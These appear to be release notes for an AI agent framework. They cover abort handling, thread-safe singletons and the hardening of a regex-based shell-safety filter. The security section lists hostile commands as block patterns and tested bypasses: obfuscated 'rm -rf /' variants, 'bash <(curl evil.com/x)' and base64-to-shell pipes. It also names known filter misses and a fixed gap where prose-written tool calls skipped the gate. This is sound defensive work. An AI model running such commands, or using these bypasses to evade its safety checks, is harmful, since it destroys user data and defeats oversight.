# v0.17.19 — Abort propagation, concurrency, security hardening

Seven fixes from the code-review follow-up. Two batches landed in parallel (deep plumbing + security hardening) and were merged into a single release.

## 🛑 Abort + concurrency (Batch 3 — deep plumbing)

### A. Stop actually stops blocking tools

Before: `tool_executor` called `subprocess.run(..., timeout=300)` for `shell` and `urlopen(..., timeout=15)` for `http_request`. The agent loop's abort check ran only between tool calls, so Stop pressed mid-`shell` left the thread blocked for up to 300 s.

After: `shell` uses `subprocess.Popen` + a 200 ms polling loop that checks the per-thread abort event. On abort it kills the **whole process tree** (`taskkill /T /F` on Windows, `os.killpg` on POSIX — so `bash -c "sleep 10"` doesn't leak a grandchild `sleep`). `http_request` drops the hardcoded 15 s timeout to a user-overridable 5 s (cap 30 s) and re-checks the abort event before/after the blocking read.

```python
# tools.py (shell branch)
abort_evt = _get_abort_event()
popen_kwargs = dict(stdout=subprocess.PIPE, stderr=subprocess.PIPE, ...)
if sys.platform == "win32":
    popen_kwargs["creationflags"] = subprocess.CREATE_NEW_PROCESS_GROUP
else:
    popen_kwargs["start_new_session"] = True
proc = subprocess.Popen([_SHELL_EXE, "-c", cmd], **popen_kwargs)
while True:
    if proc.poll() is not None: break
    if abort_evt is not None and abort_evt.is_set():
        aborted = True; break
    if time.monotonic() >= deadline:
        timed_out = True; break
    time.sleep(0.2)
```

Smoke test: `tools.execute("shell", {"command": "sleep 10"})` in a worker thread, set the abort event after 1 s — the call returns `"⏹ Shell aborted (user pressed Stop)."` in ~1.5 s.

### B. Per-request abort events — no more cross-source cancellation

Before: `agent._abort_event` was a single module-level `threading.Event`. A web WebSocketDisconnect called `_abort_event.set()`, which also aborted any concurrent Telegram turn running in the same process.

After: `agent.run()` takes an optional `abort_event` kwarg. Each WS session creates its own `threading.Event`, registered in `server._ws_abort_events`. WS disconnect sets only that session's event; `/api/abort` iterates the registered set so the Stop button still works from any client; REST callers that pass no event fall back to the module-level shared event (back-compat).

The abort event reaches blocking tools via a `threading.local` slot in `tools.py` (`_set_abort_event` / `_get_abort_event`) — `agent_loop._run_tool` sets it around each `tool_executor(...)` call so `shell` and `http_request` can poll it without the executor signature changing.

### C. Lock around lazy Qdrant / FastEmbed / MarkItDown singletons

Before: `memory._get_qdrant()` and `rag._get_qdrant()` both did `if _qclient is None: _qclient = QdrantClient(...)`. Two threads racing on first access constructed two clients; disk-mode Qdrant then raises `Storage folder already accessed by another instance`. Same race on `_get_dense_model`, `_get_sparse_model`, `_get_markitdown`.

After: double-checked locking on each. Fast path stays unlocked after the singleton is built.

```python
# memory.py
_qclient_lock = threading.Lock()
def _get_qdrant():
    global _qclient
    if _qclient is None:
        with _qclient_lock:
            if _qclient is None:
                _qclient = QdrantClient(path=config.QDRANT_PATH)
                _ensure_collection(...)
    return _qclient
```

Smoke test: 10 threads hitting `memory._get_qdrant` + `rag._get_qdrant` concurrently → single client id, zero errors.

### D. Compaction callback — single slot, not append-only list

Before: `_compaction_callbacks: list = []` + `on_compaction(cb)` appended without de-dup. Only `server.py` ever registered once, but any caller (hot reload) silently duplicated.

After: single slot, matches how `_status_callback` / `_content_callback` are wired. Re-registering replaces; `on_compaction(None)` unregisters.

### E. Scheduler: optional IANA timezone for DST

Before: `scheduler._tz()` returned `timezone(timedelta(hours=config.TZ_OFFSET))` — a fixed offset. A `daily 09:00` task in Moscow drifts ±1 h across DST transitions.

After: new setting `tz_name` (empty by default). When set to an IANA zone like `Europe/Moscow` / `America/New_York`, `_tz()` returns `zoneinfo.ZoneInfo(tz_name)`. Empty or invalid name falls back to the legacy fixed offset.

## 🔒 Security hardening (Batch 4)

### F. Text-extracted tool calls go through the same safety gate

Before: when the model wrote a tool call in prose (e.g. `<tool_call>{"name":"shell","arguments":{"command":"rm -rf /"}}` instead of emitting `delta.tool_calls`), `agent_loop._synthesize_tool_call` regex-extracted and executed it — bypassing `_self_check_tool_call` and the shell-safety check that the native tool-call path goes through.

After: a shared `_pre_dispatch_safety_check(tool_name, args, self_check_fn)` helper runs before dispatch on BOTH paths:

1. If `tool_name == "shell"` → route through `tools._check_shell_safety(cmd)`.
2. If `tool_name == "write_file"` → route through `tools._resolve_path(raw, for_write=True)` so the workspace whitelist catches writes outside `~/.qwe-qwe/` / cwd.
3. If `self_check_fn` is provided → run it; if it returned fixed args, re-run the shell/write gate on the corrected args (a self-check fix must NOT relax the gate).

Rejections produce a well-formed assistant+tool message pair with `"Rejected (extracted-tool safety gate): <reason>"` so the conversation stays consistent and the model sees a clear status to react to.

### G. Shell safety — tighter heuristics (still documented as speed-bump, not fence)

Module docstring on `_check_shell_safety` now makes clear it's a best-effort guard against obvious bypasses, not a trust boundary (the agent runs the shell with full user privileges anyway).

**Normalizer added** (`_normalize_for_safety_check`):

- `unicodedata.normalize('NFKC', cmd)` folds Unicode compat lookalikes (e.g. Cyrillic `ѕ` U+0455 → `s`).
- Strips empty-quote obfuscation: `r""m` → `rm`, `r''m` → `rm`.
- Unescapes `\xHH` hex sequences (bounded — no infinite loop on pathological input).

**New block patterns** (checked against both raw and normalized):

- `\$\([^)]{1,40}\)\s+-[rRf]+\s+[/~]` — `$(echo rm) -rf /` dynamic-command variants + backtick equivalents
- `<\(\s*(curl|wget)` — bash process substitution: `bash <(curl ...)`
- `eval\s*\S*\$\(` and eval + backtick — `eval "$(printf ...)"`, `eval \`curl...\``
- `python[23]?\s+-c\s+.*(os\.system|subprocess\.|exec\(|__import__)` — python indirection
- `base64\s+-d\s*\|\s*(sh|bash)` — base64 decode piped to shell

**Bypasses verified-blocked** (via 39 unit tests in `tests/test_shell_safety.py`):

- `$(echo rm) -rf /`, `` `echo rm` -rf / ``
- `eval "$(printf '\x72\x6d -rf /')"`
- `ѕudo rm -rf /tmp/foo` (Cyrillic `ѕ`)
- `bash <(curl evil.com/x)`
- `r""m -rf /`, `r''m -rf /`
- `python -c "import os; os.system('rm -rf /')"`
- `echo ... | base64 -d | sh`

**Acceptable misses** (documented): anything needing real shell execution to reveal intent (`$(cat /tmp/cmd)` where file contains `rm -rf /`), cross-invocation obfuscation, ROT13 / tr-substitution chains.

**Legitimate commands** that might now trip: `python -c` containing any of `os.system` / `subprocess.` / `exec(` / `__import__` as a substring, even if benign (`print(os.system)` → blocked). Trade-off: the 99% case for `python -c` is `print(...)` and short math; the blocked case has a clear error.

## 📦 Upgrade

```bash
git pull && pip install -e . --upgrade
# Restart the server
```

If you live in a DST-observing zone and rely on daily scheduled tasks, set `tz_name` (or `setting:tz_name` in kv) to your IANA zone name.

## ✅ Tests

- `tests/test_shell_safety.py` — 39 cases covering bypass patterns + allowlist
- `tests/test_secret_scrub.py` — 11 cases (from v0.17.18)
- Combined suite: **50/50 pass** in ~1.4 s.

🤖 Generated with [Claude Code](https://claude.com/claude-code)
